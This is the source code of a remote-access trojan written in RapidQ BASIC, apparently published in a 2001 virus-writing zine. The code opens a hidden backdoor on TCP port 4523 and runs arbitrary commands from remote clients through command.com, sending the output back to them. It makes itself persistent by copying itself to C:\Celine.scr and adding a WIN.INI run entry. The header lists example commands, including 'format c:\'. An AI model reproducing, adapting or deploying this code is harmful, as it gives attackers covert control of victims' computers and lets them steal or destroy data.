   ' """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   '
   '             +-----------+
   '   +-  CELINE TR0JAN  -+
   '             +-----------+
   '
   ' """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   '
   '  FASTLY CODED BY DEL_ARMG0
   '  ON 31.03.2001  for MTX #3
   '
   ' """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   '
   ' This is just a fast trojan coded in BASIC for testing RapidQ
   ' langage possibilities. It could be optimized a lot.
   '
   ' Next version will be probably in asm, with full upload and shell possibilities
   '
   '
   ' Listening port is :  4523 tcp
   '
   ' if u type CELEND, it will stop the server until next boot
   ' if u type CELYNE, ...  ;)
   '
   '
   ' TYPICAL USED COMMANDS ARE :
   '
   ' <commands> <path> <more>
   '
   ' (never forget FULL path)
   '
   ' She uses $path var. and command.com to run.
   '
   ' examples:
   ' ---------
   ' dir c:\
   ' dir c:\mirc\
   ' type c:\config.sys
   ' netstat -a -n
   ' format c:\
   ' start c:\hide\file.exe
   ' ftp -v -i -n -s:c:\ftp.scr 255.255.255.255
   ' ...
   '
   '
   ' She uses WIN.INI/[RUN] for DeepRooting
   ' Can be renamed or binded, she will copy herself as c:\celine.scr
   '
   ' """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   '
   ' DediCateD to CELINE the Sweetest h0ney Girl i could Dr3am !
   '
   ' """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   '
   '
   ' °~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~¤
   '
   '    Del_Armg0  /  MATRiX team / MTX#3
   '
   '    delly@fr.st / del_armg0@matrixvx.org
   '
   '    http://www.delly.fr.st
   '
   ' °~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~¤
   '
   ' ------ code start here --------------------------------------------------------

   '
   ' CELINE TR0JAN FASTLY CODED BY DEL_ARMG0 ON 31.03.2001 for MTX #3
   ' Yes Tr0jan in BASIC are possible ;) - Even more in RapidQ ! huhu
   ''''''''''''''''''''''''''''
   $APPTYPE GUI
   $OPTIMIZE ON
   $TYPECHECK ON
   $INCLUDE "RAPIDQ.INC"
   ''''''''''''''''''''''''''''
   DECLARE FUNCTION WritePrivateProfileString Lib "Kernel32" Alias "WritePrivateProfileStringA" _
   (ByVal lpApplicationName$, ByVal lpKeyName As String, lpString As String, ByVal lpFileName$) As Long
   ''''''''''''''''''''''''''''
   DIM Sock AS INTEGER
   DIM Connected AS LONG
   '''''''''''''''''''''
   DIM Form AS QForm
    Form.BorderStyle = bsNone
    Form.Width = 0
    Form.Height = 0
    Form.Enabled = True
    Form.Visible = False
   ''''''''''''''''''''''''''''
   CONST timeDelay = 500
   CONST PortNumb = 4523      ' Port used by trojan to receive commands
   ''''''''''''''''''''''''''''
   DECLARE SUB TimerExpired
   DIM Socket AS QSocket
   DIM Timer1 AS QTimer
   DIM MasterSocket AS INTEGER, NumClients AS INTEGER
   DIM Client(1 TO 50) AS INTEGER
   ''''''''''''''''''''''''''''
   Timer1.Interval = timeDelay
   Timer1.OnTimer = TimerExpired
   ''''''''''''''''''''''''''''
   NumClients = 0
   MasterSocket = Socket.Open(PortNumb)
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   Function WriteIni(szSection As String, svVariant As String, svValue As String, szFile As String) As Integer
            WritePrivateProfileString szSection, svVariant, svValue, szFile
   End Function
   ''''''''''''''''''''''''''''
   SUB SwapThem (N AS INTEGER)
     DIM I AS INTEGER
     FOR I = N to NumClients
     Client(I) = Client(I+1)
     NEXT
   END SUB
   ''''''''''''''''''''''''''''
   SUB SendToClient (Message AS STRING,CLID as Integer)
      Dim N as integer
      N = Socket.WriteLine(Client(CLID), Message)
   END SUB
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   SUB TimerExpired
     DIM I AS INTEGER
     DIM S AS STRING
     Timer1.Enabled = False
     Timer1.Interval = timeDelay
     IF Socket.ConnectionReady(MasterSocket) > 0 THEN
     NumClients = NumClients + 1
     Client(NumClients) = Socket.Accept(MasterSocket)
       IF Socket.WriteLine(Client(NumClients), " >>  MTX Celine Trojan 3.3.3 By Del_Armg0  -  MTX#3 VxZine Released." + Chr$(13) + Chr$(10) + " >>  Usage is : <Command> <Full_Path> <$> " + Chr$(13) + Chr$(10) + " >>  Supported commands are typical Dos commands ...  --  celend to exit " +Chr$(13)) = -1 THEN
           NumClients = NumClients - 1
      END IF
      END IF
   FOR I = 1 to NumClients
         IF Socket.IsClientReady(MasterSocket, Client(I)) > 0 THEN
         S = Socket.ReadLine(Client(I))
         IF Socket.Transferred = -1 THEN
            NumClients = NumClients - 1
            SwapThem(I)
         ELSE

                                   Dim X as String
                             IF LEN(s) > 6 then
                             X = UCASE$(MID$(S,1,6))
                            if X = "CELEND" then
                               SendToClient(" ... Celine Now 's Exiting - Sweety Honey 's Sleeping now ;) ! "+Chr$(13),I)
                               SLEEP 1
                               Kill "C:\1.0"
                               END
                               Application.Terminate
                            end if
                            if X = "CELYNE" then
                               SendToClient(" Celine si Charmante qu'elle m'éblouit par son sourire ! Luv. "+Chr$(13),I)
                            end if

    Dim XX as String
    Dim NN as Integer
      NN = LEN(S)-1
      XX = MID$(S, 1, NN)
      RUN "C:\command.com /C "+XX+">C:\1.0"
    SLEEP 2
    DIM Fichier AS QFileStream
      Fichier.Open("C:\1.0", fmOpenRead)
    SLEEP 2
      SendToClient(Fichier.ReadStr(Fichier.Size)+Chr$(13),I)
    SLEEP 2
      Kill "C:\1.0"
          END IF
         END IF
        END IF
   NEXT
   Timer1.Enabled = True
   END SUB
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   Timer1.Interval = timeDelay
   Timer1.OnTimer = TimerExpired
   IF FILEEXISTS ("C:\Celine.scr") <> 0 THEN GOTO ENDy ELSE GOTO Cpoy
   Cpoy:
   call WriteIni("Windows", "Run", "C:\Celine.scr", "C:\Windows\win.ini")
   Dim zzz as String
   zzz = Command$(0)
   RUN "C:\command.com /C Copy /B "+zzz+" C:\Celine.scr /Y"
   ENDy:
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   DO
   DoEvents
   LOOP
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' END !
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   ''''''''''''''''''''''''''''
   '°~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~¤
   '
   '   Del_Armg0  /  MATRiX team / MTX#3
   '
   '   delly@fr.st / del_armg0@matrixvx.org
   '
   '   http://www.delly.fr.st
   '
   '°~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~¤
   'MEGA GREETZ TO THE SWEETiEST GIRL : CELINE G.
